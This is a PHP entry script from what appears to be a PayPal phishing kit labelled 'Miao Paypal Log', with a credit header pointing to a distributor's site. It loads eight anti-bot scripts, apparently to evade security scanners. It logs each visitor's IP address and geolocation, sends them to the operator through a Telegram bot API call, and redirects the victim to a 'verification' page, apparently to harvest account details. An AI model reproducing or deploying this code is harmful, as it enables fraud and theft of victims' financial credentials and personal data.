<?php
/*
Official Site : https://drfxnd.com/
Page Fb : https://www.facebook.com/Dr.fxnd/
Page IN : https://www.instagram.com/drfxnd/
Page Twitter : https://twitter.com/DrFxnd

*/

include 'bots/anti1.php';
include 'bots/anti2.php';
include 'bots/anti3.php';
include 'bots/anti4.php';
include 'bots/anti5.php';
include 'bots/anti6.php';
include 'bots/anti7.php';
include 'bots/anti8.php';
include "email.php";


$ip = getenv("REMOTE_ADDR");


$file = fopen("log.txt","a");


fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";

$msg="\n=== Miao Paypal Log ===\n".$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE;

file_get_contents("https://api.telegram.org/bot".$Api."/sendMessage?chat_id=".$Chatid."&text=" . urlencode($msg)."" );


header("Location: verification/");